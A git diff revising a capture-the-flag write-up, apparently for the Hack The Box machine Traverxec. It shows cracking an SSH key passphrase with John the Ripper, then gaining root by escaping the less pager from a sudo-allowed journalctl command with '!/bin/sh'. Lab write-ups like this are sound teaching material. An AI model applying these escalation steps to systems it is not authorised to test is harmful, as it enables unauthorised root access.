@@ -209,12 +209,17 @@ So there is a folder named `public_www`, in the folder `/home/david`
 
 Lets see whats in the there
 
-```
-##TO DO
+```bash
+$ cd /home/david/public_www
+$ ls
+index.html  protected-file-area
+$ cd protected-file-area
+$ ls
+backup-ssh-identity-files.tgz  home
 ```
 
-Looks like a backup of ssh files and the private key is encrypted with a pass phrase.
-Lets try to bruteforce it 
+Looks like a backup of ssh files. I copied it to my system and extracted it. The private key is encrypted with a pass phrase.
+Lets try to bruteforce the pass phrase using `John`
 #### John The Ripper
 We have to convert it before cracking, using `ssh2john.py`
 ```bash
@@ -276,15 +281,22 @@ After bit of searching around, I found this `journalctl` [vulnerability.](https:
 So the command `usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` prints out the log and exits. But we can't exploit it because `journalctl` exits right after printing.
 Our aim is to launch a shell from within the `journalctl` command. Journalctl uses `less` command by default to view the log. So we have to find a way to prevent the command from exiting. The trick can be found in the `journalctl` man page. 
 ```bash
-man journalctl | grep width
+man journalctl | grep width -B 1 -A 2
+
+        The output is paged through less by default, and long lines are "truncated" to screen width. The hidden part can be viewed by using the left-arrow and right-arrow
+        keys. Paging can be disabled; see the --no-pager option and the "Environment" section below.
 ```
 So if we run this command in a small resized window, it won't exit after printing the log and then we can spawn a shell as `root` user.
 
+![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/traverxec_root.png){: .align-center}
+
 (In a small window)
 ```bash
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+
 !done  (press RETURN)
 !/bin/sh
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-And we are root!!!
+And we are root!
